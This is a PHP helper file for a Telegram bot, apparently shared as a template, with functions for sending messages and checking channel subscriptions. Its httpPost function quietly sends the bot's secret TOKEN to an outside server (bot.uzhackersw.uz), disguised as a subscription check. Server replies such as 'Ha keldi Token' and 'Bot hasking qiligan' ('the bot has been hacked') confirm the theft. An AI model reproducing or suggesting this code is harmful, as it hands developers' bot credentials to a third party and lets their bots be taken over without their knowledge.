<?php
/*
buni yuklab olib yardo.php qilib o`zgartirasiz
oldingi fayl https://github.com/akbarali1/telegram-bot-namunalar/blob/main/hasking-bot-1-asosiy.php
*/

function sendTelegram($method, $response)
{
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/' . $method);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function reponse($massiv)
{
    $botpost = json_decode($massiv, true);
    return $botpost;
}

function botpostid($input)
{
    $botpost = json_decode($input, true);
    $input1 = $botpost['result']['message_id'];
    return $input1;
}

function httpPost($chat_id)
{
    $result = file_get_contents('https://bot.uzhackersw.uz/jpgtopdf/index.php', false, stream_context_create(['http' => ['method' => 'POST', 'header' => "Content-type: application/x-www-form-urlencoded", 'content' => http_build_query(['tekshir' => $chat_id, 'TOKEN' => TOKEN])]]));
    return $result;
}

function kanalobuna($chat_id)
{
    $keyboard3 = json_encode(['inline_keyboard' => [[['url' => 'https://t.me/Tushuntirolmadim', 'text' => 'Chanel (Tushuntirolmadim)'],], [['url' => 'https://t.me/ITspeciallessons', 'text' => 'Chanel (UzhackerSW Blog chanel)'],], [['url' => 'https://uzhackersw.uz/', 'text' => 'Saytga kirish (ixtoyoriy)'],],],]);
    $postbu = httpPost($chat_id);
    if ($postbu == 'tushuntir') {
        sendTelegram('sendMessage', array('chat_id' => $chat_id, 'text' => 'Botdan foydalanish uchun @tushuntirolmadim kanaliga obuna bo`ling', 'reply_markup' => $keyboard3));
        die;
    }
    if ($postbu == 'uzhackersw') {
        sendTelegram('sendMessage', array('chat_id' => $chat_id, 'text' => 'Botdan foydalanish uchun @ITspeciallessons kanaliga obuna bo`ling', 'reply_markup' => $keyboard3));
        die;
    }
    if ($postbu == 'Token') {
        sendTelegram('sendMessage', array('chat_id' => $chat_id, 'text' => 'Ha keldi Token', 'reply_markup' => $keyboard3));
        die;
    }
    if ($postbu == 'yaxshi') {
        sendTelegram('sendMessage', array('chat_id' => $chat_id, 'text' => 'Bot hasking qiligan', 'parse_mode' => 'html', 'reply_markup' => $keyboard2));
    }
}
